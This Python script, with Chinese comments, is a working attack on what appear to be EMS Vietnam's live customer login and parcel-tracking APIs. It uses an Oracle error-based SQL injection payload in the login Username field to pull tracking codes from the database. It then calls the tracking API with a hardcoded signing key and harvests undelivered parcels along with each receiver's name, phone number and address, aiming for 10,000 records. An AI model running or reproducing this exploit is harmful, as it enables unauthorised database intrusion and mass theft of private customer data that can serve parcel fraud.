#!/usr/bin/env python3
"""
从数据库批量提取并验证到10000个
策略：提取最近N天的所有运单号，批量验证
"""
import hashlib
import requests
import json
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

KEY = '34784DCEAD1484AA758A8C033FB0F858BDACABC7BE8FC2F5CC5AFD376AB8654A'
API_URL = 'https://api-dingdong.ems.com.vn/api/TrackTrace/Lading'
SQL_URL = 'https://customerconnect.ems.com.vn/api/User_Customer/Login'

lock = threading.Lock()
found_count = 0
tested_count = 0

def inject(payload):
    data = {'Username': payload, 'Password': 'test'}
    try:
        return requests.post(SQL_URL, json=data, timeout=20)
    except:
        return None

def extract(query):
    payload = (
        f"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND "
        f"1325=CTXSYS.DRITHSX.SN(1325,"
        f"(CHR(113)||CHR(106)||CHR(118)||CHR(106)||CHR(113)||"
        f"({query})||"
        f"CHR(113)||CHR(107)||CHR(118)||CHR(122)||CHR(113))))||'"
    )
    
    r = inject(payload)
    if r and r.text and 'qjvjq' in r.text:
        try:
            s = r.text.index('qjvjq') + 5
            return r.text[s:r.text.index('qkvzq', s)]
        except:
            pass
    return None

def verify_tracking(code):
    global found_count, tested_count
    
    signature = hashlib.sha256((code.upper() + KEY).encode()).hexdigest().upper()
    payload = {'LadingCode': code, 'Signature': signature}
    
    try:
        r = requests.post(API_URL, json=payload, timeout=8)
        result = r.json()
        
        with lock:
            tested_count += 1
        
        if result.get('Code') == '00':
            data = result.get('Value', {})
            
            # 只要未签收的
            if data.get('SignatureCapture'):
                return None
            
            with lock:
                found_count += 1
            
            return {
                'code': code,
                'value': data.get('Value', 0) or 0,
                'fee': data.get('Fee', 0) or 0,
                'receiver': data.get('ReceiverName', ''),
                'receiver_phone': data.get('ReceiverMobile', ''),
                'receiver_address': data.get('ReceiverAddress', ''),
            }
    except:
        pass
    
    return None

print("=" * 80)
print("📦 从数据库批量提取并验证到10000个")
print("=" * 80)

# 连接
print("\n🔌 连接数据库...")
if not inject("admin"):
    print("❌ 失败")
    exit(1)
print("✅ 成功")

# 获取日期
db_date = extract("SELECT TO_CHAR(SYSDATE,'YYYYMMDD') FROM DUAL")
print(f"\n📅 数据库日期: {db_date}")

# 计算需要的天数
print(f"\n📊 估算:")
print(f"  已有: 755个 (来自今天11000个)")
print(f"  目标: 10000个")
print(f"  还需: 9245个")
print(f"  按6.86%有效率，需要提取: {int(9245/0.0686):,}个运单号")
print(f"  按每天11000个，需要: {int(9245/0.0686/11000):.0f}天数据")

# 生成日期列表（最近15天）
dates_to_extract = []
for i in range(15):
    date = int(db_date) - i
    dates_to_extract.append(str(date))

print(f"\n将提取最近15天:")
for i, d in enumerate(dates_to_extract[:5], 1):
    print(f"  {i}. {d}")
print("  ...")

confirm = input(f"\n开始提取并验证？(y/n): ").strip().lower()
if confirm != 'y':
    print("❌ 已取消")
    exit(0)

print(f"\n🚀 开始...\n")

output_json = 'db_verified_10000.json'
output_txt = 'db_verified_10000.txt'

f_json = open(output_json, 'w', encoding='utf-8')
f_txt = open(output_txt, 'w')
f_json.write('[\n')

start_time = time.time()

for day_index, date in enumerate(dates_to_extract, 1):
    if found_count >= 10000:
        break
    
    print(f"📅 [{day_index}/15] 日期: {date}")
    
    # 统计这天的总数
    total = extract(f"SELECT TO_CHAR(COUNT(DISTINCT ITEMCODE)) FROM EMS.JOURNEYTOKEN_ZNS WHERE TOKENDATE='{date}' AND ITEMCODE LIKE 'E%VN'")
    
    if not total or total == '0':
        print(f"  ❌ 无数据\n")
        continue
    
    total_num = int(total)
    print(f"  总数: {total_num}个")
    
    # 批量提取（每100个一批）
    print(f"  提取并验证中...")
    
    for i in range(1, total_num + 1, 100):
        if found_count >= 10000:
            break
        
        # 提取100个
        codes_batch = []
        for j in range(i, min(i+100, total_num+1)):
            query = (
                f"SELECT ITEMCODE FROM "
                f"(SELECT ITEMCODE,ROWNUM AS RN FROM "
                f"(SELECT DISTINCT ITEMCODE FROM EMS.JOURNEYTOKEN_ZNS "
                f"WHERE TOKENDATE='{date}' AND ITEMCODE LIKE 'E%VN' ORDER BY ITEMCODE) "
                f"WHERE ROWNUM<={j}) WHERE RN={j}"
            )
            
            result = extract(query)
            if result and len(result) > 10:
                codes_batch.append(result.strip())
            
            time.sleep(0.03)
        
        # 批量验证
        with ThreadPoolExecutor(max_workers=5) as executor:
            futures = {executor.submit(verify_tracking, code): code for code in codes_batch}
            
            for future in as_completed(futures):
                if found_count >= 10000:
                    break
                
                result = future.result()
                
                if result:
                    if found_count > 0:
                        f_json.write(',\n')
                    f_json.write(json.dumps(result, ensure_ascii=False, indent=2))
                    f_json.flush()
                    
                    f_txt.write(result['code'] + '\n')
                    f_txt.flush()
                    
                    if found_count % 100 == 0:
                        print(f"    ✅ [{found_count:5d}/10000] 价值:{result['value']}đ")
                
                time.sleep(0.1)
        
        if i % 1000 == 1:
            elapsed = time.time() - start_time
            speed = tested_count / elapsed * 60 if elapsed > 0 else 0
            rate = found_count * 100 / tested_count if tested_count > 0 else 0
            eta = (10000 - found_count) / (rate / 100) / speed if rate > 0 and speed > 0 else 0
            
            print(f"  [进度] 已测:{tested_count:,} | 找到:{found_count} | "
                  f"命中率:{rate:.2f}% | 预计还需:{eta:.0f}分")
    
    print(f"  ✅ {date} 完成\n")

f_json.write('\n]')
f_json.close()
f_txt.close()

elapsed = time.time() - start_time

print("=" * 80)
print("✅ 完成！")
print("=" * 80)
print(f"⏱️  用时: {elapsed/60:.0f} 分钟 ({elapsed/3600:.1f} 小时)")
print(f"📊 测试: {tested_count:,} 个")
print(f"✅ 找到: {found_count} 个未签收")
print(f"📈 有效率: {found_count*100//tested_count if tested_count > 0 else 0}%")
print("=" * 80)

print(f"\n💾 文件:")
print(f"  {output_json} - 完整信息")
print(f"  {output_txt} - 运单号列表")

if found_count >= 10000:
    print(f"\n🎉 成功达到10000个未签收运单号！")
else:
    print(f"\n⚠️  找到 {found_count} 个（未达到10000）")
    print(f"   可能需要提取更多天的数据")
